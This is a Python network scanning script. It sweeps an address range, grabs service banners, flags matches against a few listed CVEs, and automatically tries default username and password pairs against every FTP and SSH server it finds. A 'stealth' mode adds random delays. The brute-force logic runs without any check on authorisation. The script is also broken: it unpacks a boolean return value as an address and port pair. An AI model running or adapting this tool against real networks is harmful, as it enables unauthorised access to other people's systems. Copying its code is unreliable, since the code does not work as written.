import socket
import ipaddress
import concurrent.futures
import time
import random
from ftplib import FTP
import paramiko
import json
from datetime import datetime
import argparse

# Vulnerability database (simplified for demo)
VULNERABILITIES = {
    "HTTP": {
        "Apache/2.4.29": "CVE-2021-41773",
        "nginx/1.18.0": "CVE-2021-23017"
    },
    "FTP": {
        "vsftpd 2.3.4": "CVE-2011-2523"
    }
}

# Common credentials for brute-forcing
COMMON_CREDENTIALS = [
    ("admin", "admin"),
    ("root", "toor"),
    ("user", "password")
]

def generate_report(active_devices, elapsed_time, output_file="scan_report.json"):
    """Generate a JSON report of the scan results."""
    report = {
        "timestamp": datetime.now().isoformat(),
        "scan_duration_seconds": elapsed_time,
        "devices": active_devices
    }
    
    with open(output_file, "w") as f:
        json.dump(report, f, indent=4)
    print(f"[+] Report saved to {output_file}")

def is_device_active(ip, port=80, timeout=1):
    """Check if a device is active by attempting to connect to a specified port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((str(ip), port))
            return True
    except (socket.timeout, socket.error):
        return False

def grab_banner(ip, port, timeout=1):
    """Grab service banner for service discovery."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((str(ip), port))
            s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            return s.recv(1024).decode('utf-8', 'ignore')
    except:
        return None

def check_vulnerabilities(service, banner):
    """Check for known vulnerabilities based on service banners."""
    for version, cve in VULNERABILITIES.get(service, {}).items():
        if version in banner:
            return f"Vulnerable: {cve}"
    return "No known vulnerabilities"

def brute_force_ftp(ip, port=21):
    """Brute-force FTP credentials."""
    for username, password in COMMON_CREDENTIALS:
        try:
            ftp = FTP()
            ftp.connect(str(ip), port, timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return f"FTP credentials cracked: {username}/{password}"
        except:
            continue
    return "FTP brute-force failed"

def brute_force_ssh(ip, port=22):
    """Brute-force SSH credentials."""
    for username, password in COMMON_CREDENTIALS:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(str(ip), port, username, password, timeout=5)
            ssh.close()
            return f"SSH credentials cracked: {username}/{password}"
        except:
            continue
    return "SSH brute-force failed"

def scan_network(network_cidr, ports=[21, 22, 80, 443], max_threads=50, stealth=False):
    """Scan a network for active devices with enhanced features."""
    active_devices = {}
    network = ipaddress.ip_network(network_cidr, strict=False)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for ip in network.hosts():
            for port in ports:
                if stealth:
                    time.sleep(random.uniform(0.1, 1.0))  # Random delay for stealth
                futures.append(executor.submit(is_device_active, ip, port))
        
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                ip, port = future.result()
                if ip not in active_devices:
                    active_devices[ip] = {"ports": [], "services": {}}
                active_devices[ip]["ports"].append(port)
                banner = grab_banner(ip, port)
                if banner:
                    active_devices[ip]["services"][port] = {
                        "banner": banner,
                        "vulnerabilities": check_vulnerabilities("HTTP" if port in [80, 443] else "FTP", banner)
                    }
                if port == 21:
                    active_devices[ip]["ftp_creds"] = brute_force_ftp(ip)
                elif port == 22:
                    active_devices[ip]["ssh_creds"] = brute_force_ssh(ip)
    
    return active_devices

def main():
    """Main function to run the enhanced network scanner."""
    parser = argparse.ArgumentParser(description="Advanced Network Scanner with Vulnerability Assessment")
    parser.add_argument("--network", required=True, help="Network CIDR (e.g., 192.168.1.0/24)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--report", default="scan_report.json", help="Output report filename")
    parser.add_argument("--ports", default="21,22,80,443", help="Comma-separated list of ports to scan")
    parser.add_argument("--threads", type=int, default=50, help="Maximum number of threads")
    
    args = parser.parse_args()
    
    ports = [int(p) for p in args.ports.split(",")]
    
    print(f"[*] Scanning network {args.network} with enhanced features...")
    start_time = time.time()
    active_devices = scan_network(
        network_cidr=args.network,
        ports=ports,
        max_threads=args.threads,
        stealth=args.stealth
    )
    elapsed_time = time.time() - start_time
    
    print(f"\n[+] Scan completed in {elapsed_time:.2f} seconds.")
    for ip, data in active_devices.items():
        print(f"\n[+] Device: {ip}")
        print(f"  - Open ports: {data['ports']}")
        for port, service in data.get("services", {}).items():
            print(f"  - Port {port}: {service['banner']}")
            print(f"    - {service['vulnerabilities']}")
        if "ftp_creds" in data:
            print(f"  - {data['ftp_creds']}")
        if "ssh_creds" in data:
            print(f"  - {data['ssh_creds']}")
    
    generate_report(active_devices, elapsed_time, args.report)

if __name__ == "__main__":
    main() 
